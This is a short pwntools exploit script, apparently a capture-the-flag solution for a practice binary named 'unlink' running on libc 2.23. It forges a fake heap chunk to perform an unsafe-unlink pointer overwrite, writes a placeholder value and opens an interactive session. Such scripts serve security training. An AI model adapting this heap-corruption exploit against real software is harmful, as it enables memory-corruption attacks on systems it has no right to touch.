from pwn import *

#r = remote("jackgrence.nctu.me", 9002)
r = process(["./unlink"], env={'LD_PRELOAD': './libc-2.23.so'})

def delete(idx):
    r.recvuntil("show")
    r.sendline("0")
    r.recvuntil("x = ")
    r.sendline(str(idx))

def add(idx):
    r.recvuntil("show")
    r.sendline("1")
    r.recvuntil("x = ")
    r.sendline(str(idx))

def write(idx, data):
    r.recvuntil("show")
    r.sendline("2")
    r.recvuntil("x = ")
    r.sendline(str(idx))
    r.recvuntil("string = ")
    r.sendline(data)

def show(idx):
    r.recvuntil("show")
    r.sendline("3")
    r.recvuntil("x = ")
    r.sendline(str(idx))


victim_addr = int((r.recvline()[17:]).strip(),16)
size_addr = int((r.recvline()[15:]).strip(),16)
ary_addr = int((r.recvline()[12:]).strip(),16)
print("victim_addr: ", hex(victim_addr))
print("size_addr: ", hex(size_addr))
print("ary_addr: ", hex(ary_addr))

add(0)
add(1)
fake_data = p64(0x0) + p64(0x80) + p64(ary_addr-0x18) + p64(ary_addr-0x10) + b"A"*0x60 + p64(0x80) + p64(0x90)
write(0, fake_data)
delete(1)
payload = b"a"*0x10 + p64(0xdeadbeef)
write(0, payload)
r.recvuntil("show")
r.sendline("5")
r.interactive()